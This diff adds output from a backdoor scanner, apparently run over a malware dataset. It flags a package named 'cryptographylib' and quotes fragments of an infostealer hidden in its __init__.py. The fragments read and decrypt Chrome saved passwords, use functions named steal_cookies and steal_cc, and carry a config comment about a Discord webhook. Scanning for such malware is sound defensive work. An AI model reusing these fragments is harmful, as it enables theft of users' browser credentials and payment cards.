+                "region": {
+                  "startLine": 756,
+                  "startColumn": 14,
+                  "endLine": 756,
+                  "endColumn": 22,
+                  "snippet": {
+                    "text": "\r\n\r\n    @extract_try\r\n    def steal_passwords(self):\r\n        f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding=\"cp437\", errors='ignore')\r\n        for prof in os.listdir(self.chrmmuserdtt):\r\n            if re.match(self.chrmrgx, prof):\r\n",
+                    "rendered": {
+                      "text": "\r\n\r\n    @extract_try\r\n    def steal_passwords(self):\r\n        f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding=\"cp437\", errors='ignore')\r\n        for prof in os.listdir(self.chrmmuserdtt):\r\n            if re.match(self.chrmrgx, prof):\r\n",
+                      "markdown": "`\r\n\r\n    @extract_try\r\n    def steal_passwords(self):\r\n        f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding=\"cp437\", errors='ignore')\r\n        for prof in os.listdir(self.chrmmuserdtt):\r\n            if re.match(self.chrmrgx, prof):\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 723,
+                  "startColumn": 69,
+                  "endLine": 723,
+                  "endColumn": 77,
+                  "snippet": {
+                    "text": "                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n        cursor.close()\r\n        conn.close()\r\n        os.remove(loginvault)\r\n",
+                    "rendered": {
+                      "text": "                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n        cursor.close()\r\n        conn.close()\r\n        os.remove(loginvault)\r\n",
+                      "markdown": "`                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n        cursor.close()\r\n        conn.close()\r\n        os.remove(loginvault)\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 721,
+                  "startColumn": 42,
+                  "endLine": 721,
+                  "endColumn": 50,
+                  "snippet": {
+                    "text": "        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n        cursor.close()\r\n",
+                    "rendered": {
+                      "text": "        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n        cursor.close()\r\n",
+                      "markdown": "`        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n        cursor.close()\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 721,
+                  "startColumn": 16,
+                  "endLine": 721,
+                  "endColumn": 24,
+                  "snippet": {
+                    "text": "        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n        cursor.close()\r\n",
+                    "rendered": {
+                      "text": "        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n        cursor.close()\r\n",
+                      "markdown": "`        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n        cursor.close()\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 720,
+                  "startColumn": 31,
+                  "endLine": 720,
+                  "endColumn": 39,
+                  "snippet": {
+                    "text": "        cursor = conn.cursor()\r\n        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n",
+                    "rendered": {
+                      "text": "        cursor = conn.cursor()\r\n        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n",
+                      "markdown": "`        cursor = conn.cursor()\r\n        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 719,
+                  "startColumn": 74,
+                  "endLine": 719,
+                  "endColumn": 82,
+                  "snippet": {
+                    "text": "        conn = sqlite3.connect(loginvault)\r\n        cursor = conn.cursor()\r\n        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n",
+                    "rendered": {
+                      "text": "        conn = sqlite3.connect(loginvault)\r\n        cursor = conn.cursor()\r\n        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n",
+                      "markdown": "`        conn = sqlite3.connect(loginvault)\r\n        cursor = conn.cursor()\r\n        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n                if url != \"\":\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 718,
+                  "startColumn": 58,
+                  "endLine": 718,
+                  "endColumn": 66,
+                  "snippet": {
+                    "text": "        copy2(path, loginvault)\r\n        conn = sqlite3.connect(loginvault)\r\n        cursor = conn.cursor()\r\n        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n",
+                    "rendered": {
+                      "text": "        copy2(path, loginvault)\r\n        conn = sqlite3.connect(loginvault)\r\n        cursor = conn.cursor()\r\n        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n",
+                      "markdown": "`        copy2(path, loginvault)\r\n        conn = sqlite3.connect(loginvault)\r\n        cursor = conn.cursor()\r\n        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\r\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\r\n                url, username, password = res\r\n                password = self.dcrpt_val(password, self.masterkey)\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 709,
+                  "startColumn": 14,
+                  "endLine": 709,
+                  "endColumn": 22,
+                  "snippet": {
+                    "text": "\r\n\r\n    @extract_try\r\n    def steal_passwords2(self, name: str, path: str, profile: str):\r\n        path += '\\\\' + profile + '\\\\Login Data'\r\n        if not os.path.isfile(path):\r\n            return\r\n",
+                    "rendered": {
+                      "text": "\r\n\r\n    @extract_try\r\n    def steal_passwords2(self, name: str, path: str, profile: str):\r\n        path += '\\\\' + profile + '\\\\Login Data'\r\n        if not os.path.isfile(path):\r\n            return\r\n",
+                      "markdown": "`\r\n\r\n    @extract_try\r\n    def steal_passwords2(self, name: str, path: str, profile: str):\r\n        path += '\\\\' + profile + '\\\\Login Data'\r\n        if not os.path.isfile(path):\r\n            return\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 588,
+                  "startColumn": 38,
+                  "endLine": 588,
+                  "endColumn": 46,
+                  "snippet": {
+                    "text": "            decrypted_pass = decrypted_pass[:-16].decode()\r\n            return decrypted_pass\r\n        except Exception:\r\n            return \"Failed to decrypt password\"\r\n\r\n    def get_master_key(self, path):\r\n        with open(path, \"r\", encoding=\"utf-8\") as f:\r\n",
+                    "rendered": {
+                      "text": "            decrypted_pass = decrypted_pass[:-16].decode()\r\n            return decrypted_pass\r\n        except Exception:\r\n            return \"Failed to decrypt password\"\r\n\r\n    def get_master_key(self, path):\r\n        with open(path, \"r\", encoding=\"utf-8\") as f:\r\n",
+                      "markdown": "`            decrypted_pass = decrypted_pass[:-16].decode()\r\n            return decrypted_pass\r\n        except Exception:\r\n            return \"Failed to decrypt password\"\r\n\r\n    def get_master_key(self, path):\r\n        with open(path, \"r\", encoding=\"utf-8\") as f:\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 505,
+                  "startColumn": 45,
+                  "endLine": 505,
+                  "endColumn": 53,
+                  "snippet": {
+                    "text": "            \r\n        if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:\r\n            os.makedirs(ntpath.join(self.dir, 'Google'), exist_ok=True)\r\n            function_list.extend([self.steal_passwords, self.steal_cookies, self.steal_history])\r\n\r\n        for func in function_list:\r\n            process = threading.Thread(target=func, daemon=True)\r\n",
+                    "rendered": {
+                      "text": "            \r\n        if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:\r\n            os.makedirs(ntpath.join(self.dir, 'Google'), exist_ok=True)\r\n            function_list.extend([self.steal_passwords, self.steal_cookies, self.steal_history])\r\n\r\n        for func in function_list:\r\n            process = threading.Thread(target=func, daemon=True)\r\n",
+                      "markdown": "`            \r\n        if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:\r\n            os.makedirs(ntpath.join(self.dir, 'Google'), exist_ok=True)\r\n            function_list.extend([self.steal_passwords, self.steal_cookies, self.steal_history])\r\n\r\n        for func in function_list:\r\n            process = threading.Thread(target=func, daemon=True)\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 492,
+                  "startColumn": 27,
+                  "endLine": 492,
+                  "endColumn": 35,
+                  "snippet": {
+                    "text": "            self.funcs = [\r\n                self.steal_cookies2,\r\n                self.steal_history2,\r\n                self.steal_passwords2,\r\n                self.steal_cc2\r\n            ]\r\n\r\n",
+                    "rendered": {
+                      "text": "            self.funcs = [\r\n                self.steal_cookies2,\r\n                self.steal_history2,\r\n                self.steal_passwords2,\r\n                self.steal_cc2\r\n            ]\r\n\r\n",
+                      "markdown": "`            self.funcs = [\r\n                self.steal_cookies2,\r\n                self.steal_history2,\r\n                self.steal_passwords2,\r\n                self.steal_cc2\r\n            ]\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000600"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Windows Indicator",
+            "id": "BD000600"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 59,
+                  "startColumn": 28,
+                  "endLine": 59,
+                  "endColumn": 32,
+                  "snippet": {
+                    "text": "#    \"yourwebhookurl\" = your discord webhook url\r\n#    \"hide\" = you want to hide grabber? ('yes' or 'no')\r\n#    \"dbugkiller\" = recommand to let this\r\n#    \"blprggg\" = don't touch at this\r\n#\r\n# `\r\n\r\n",
+                    "rendered": {
+                      "text": "#    \"yourwebhookurl\" = your discord webhook url\r\n#    \"hide\" = you want to hide grabber? ('yes' or 'no')\r\n#    \"dbugkiller\" = recommand to let this\r\n#    \"blprggg\" = don't touch at this\r\n#\r\n# `\r\n\r\n",
+                      "markdown": "`#    \"yourwebhookurl\" = your discord webhook url\r\n#    \"hide\" = you want to hide grabber? ('yes' or 'no')\r\n#    \"dbugkiller\" = recommand to let this\r\n#    \"blprggg\" = don't touch at this\r\n#\r\n# `\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 219,
+                  "startColumn": 11,
+                  "endLine": 219,
+                  "endColumn": 15,
+                  "snippet": {
+                    "text": "        req = httpx.get(\"https://ipinfo.io/json\")\r\n        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n",
+                    "rendered": {
+                      "text": "        req = httpx.get(\"https://ipinfo.io/json\")\r\n        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n",
+                      "markdown": "`        req = httpx.get(\"https://ipinfo.io/json\")\r\n        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 36,
+                  "startColumn": 4,
+                  "endLine": 36,
+                  "endColumn": 12,
+                  "snippet": {
+                    "text": "\r\n\r\nfrom sqlite3 import connect\r\nfrom base64 import b64decode\r\nfrom urllib.request import Request, urlopen\r\nfrom shutil import copy2\r\nfrom datetime import datetime, timedelta, timezone\r\n",
+                    "rendered": {
+                      "text": "\r\n\r\nfrom sqlite3 import connect\r\nfrom base64 import b64decode\r\nfrom urllib.request import Request, urlopen\r\nfrom shutil import copy2\r\nfrom datetime import datetime, timedelta, timezone\r\n",
+                      "markdown": "`\r\n\r\nfrom sqlite3 import connect\r\nfrom base64 import b64decode\r\nfrom urllib.request import Request, urlopen\r\nfrom shutil import copy2\r\nfrom datetime import datetime, timedelta, timezone\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 35,
+                  "startColumn": 4,
+                  "endLine": 35,
+                  "endColumn": 13,
+                  "snippet": {
+                    "text": "import pyperclip\r\n\r\n\r\nfrom sqlite3 import connect\r\nfrom base64 import b64decode\r\nfrom urllib.request import Request, urlopen\r\nfrom shutil import copy2\r\n",
+                    "rendered": {
+                      "text": "import pyperclip\r\n\r\n\r\nfrom sqlite3 import connect\r\nfrom base64 import b64decode\r\nfrom urllib.request import Request, urlopen\r\nfrom shutil import copy2\r\n",
+                      "markdown": "`import pyperclip\r\n\r\n\r\nfrom sqlite3 import connect\r\nfrom base64 import b64decode\r\nfrom urllib.request import Request, urlopen\r\nfrom shutil import copy2\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 31,
+                  "startColumn": 6,
+                  "endLine": 31,
+                  "endColumn": 12,
+                  "snippet": {
+                    "text": "import base64\r\nimport requests\r\nimport ctypes\r\nimport time\r\nimport pyperclip\r\n\r\n\r\n",
+                    "rendered": {
+                      "text": "import base64\r\nimport requests\r\nimport ctypes\r\nimport time\r\nimport pyperclip\r\n\r\n\r\n",
+                      "markdown": "`import base64\r\nimport requests\r\nimport ctypes\r\nimport time\r\nimport pyperclip\r\n\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 28,
+                  "startColumn": 6,
+                  "endLine": 28,
+                  "endColumn": 14,
+                  "snippet": {
+                    "text": "import zipfile\r\nimport httpx\r\nimport psutil\r\nimport base64\r\nimport requests\r\nimport ctypes\r\nimport time\r\n",
+                    "rendered": {
+                      "text": "import zipfile\r\nimport httpx\r\nimport psutil\r\nimport base64\r\nimport requests\r\nimport ctypes\r\nimport time\r\n",
+                      "markdown": "`import zipfile\r\nimport httpx\r\nimport psutil\r\nimport base64\r\nimport requests\r\nimport ctypes\r\nimport time\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 21,
+                  "startColumn": 6,
+                  "endLine": 21,
+                  "endColumn": 15,
+                  "snippet": {
+                    "text": "import random\r\nimport re\r\nimport shutil\r\nimport sqlite3\r\nimport subprocess\r\nimport threading\r\nimport winreg\r\n",
+                    "rendered": {
+                      "text": "import random\r\nimport re\r\nimport shutil\r\nimport sqlite3\r\nimport subprocess\r\nimport threading\r\nimport winreg\r\n",
+                      "markdown": "`import random\r\nimport re\r\nimport shutil\r\nimport sqlite3\r\nimport subprocess\r\nimport threading\r\nimport winreg\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        }
+      ],
+      "columnKind": "utf16CodeUnits"
+    }
+  ]
+}
